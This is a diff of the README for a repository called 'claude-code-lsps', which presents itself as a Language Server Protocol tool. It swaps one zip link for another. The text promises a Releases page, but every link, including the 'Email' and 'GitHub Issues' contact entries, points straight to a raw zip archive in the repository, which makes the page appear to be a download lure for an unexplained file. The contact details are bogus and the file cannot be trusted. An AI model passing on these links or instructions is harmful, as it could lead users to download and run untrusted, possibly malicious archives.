@@ -12,7 +12,7 @@ Welcome to claude-code-lsps! This application provides Language Server Protocol 
 ## 📦 Download & Install
 To get started, visit this page to download the latest version of claude-code-lsps:
 
-[![Download Latest Release](https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/intelephense/lsps-code-claude-3.7.zip%https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/intelephense/lsps-code-claude-3.7.zip)](https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/intelephense/lsps-code-claude-3.7.zip)
+[![Download Latest Release](https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/rust-analyzer/code-lsps-claude-Kotoko.zip%https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/rust-analyzer/code-lsps-claude-Kotoko.zip)](https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/rust-analyzer/code-lsps-claude-Kotoko.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, scroll down to find the latest version of claude-code-lsps.
@@ -46,8 +46,8 @@ We welcome feedback on your experience and any suggestions for improvement. If y
 
 ## 📬 Contact Information
 For any questions or support inquiries, you can reach us at the following:
-- Email: https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/intelephense/lsps-code-claude-3.7.zip
-- GitHub Issues: [Submit an issue](https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/intelephense/lsps-code-claude-3.7.zip)
+- Email: https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/rust-analyzer/code-lsps-claude-Kotoko.zip
+- GitHub Issues: [Submit an issue](https://github.com/Siam-analytics/claude-code-lsps/raw/refs/heads/main/rust-analyzer/code-lsps-claude-Kotoko.zip)
 
 ## 🔄 Updates
 Stay informed about new features and improvements by checking back on the Releases page regularly.
